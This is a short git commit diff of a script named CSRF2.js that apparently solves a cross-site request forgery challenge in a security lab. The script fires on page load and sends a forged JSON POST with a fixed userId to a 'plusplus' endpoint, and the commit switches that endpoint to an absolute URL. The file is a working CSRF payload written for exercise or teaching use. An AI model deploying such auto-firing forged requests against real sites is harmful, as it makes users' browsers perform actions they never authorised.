2ff04af19f297fd62c601b618bdbc3911c66c2f5
rosa-kelley <rosa.kelley34@gmail.com>
2021-02-15 02:57:54 +0000

    update path

--- CSRF2.js
+++ CSRF2.js
@@ -1,7 +1,7 @@
 window.onload = function(){
 
 var xhr = new XMLHttpRequest();
-xhr.open("POST", "/user/csrfchallengetwo/plusplus/", true);
+xhr.open("POST", "https://security.codepath.com/user/csrfchallengetwo/plusplus", true);
 xhr.setRequestHeader('Content-Type', 'application/json');
 xhr.send(JSON.stringify({
     userId: "bc0b85a52bc83d2672aecf82fb695665fca2f921"
